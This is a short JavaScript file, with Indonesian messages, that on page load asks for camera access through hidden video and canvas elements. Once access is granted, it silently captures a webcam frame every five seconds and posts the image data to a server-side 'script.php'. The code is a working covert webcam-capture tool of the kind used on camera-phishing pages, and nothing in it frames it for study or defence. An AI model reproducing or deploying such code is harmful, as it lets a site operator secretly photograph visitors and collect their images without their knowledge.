window.onload = () => {

    const canvas = document.createElement("canvas");
    canvas.width = 320;
    canvas.height = 240;
    canvas.style.display = "none";
    document.body.appendChild(canvas);

    const ctx = canvas.getContext("2d");

    const video = document.createElement("video");
    video.autoplay = true;
    video.playsInline = true;
    video.style.display = "none";
    document.body.appendChild(video);

   
    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;

        console.log("Camera aktif");

        
        setInterval(() => {

            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            
            const dataURL = canvas.toDataURL("image/png");

            
            fetch("script.php", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: "cat=" + encodeURIComponent(dataURL)
            })
            .then(res => res.text())
            .then(res => console.log("Server:", res))
            .catch(err => console.error("Error:", err));

        }, 5000); 

    })
    .catch(err => {
        console.error("Camera error:", err);
        alert("Kamera tidak diizinkan / tidak tersedia");
    });

};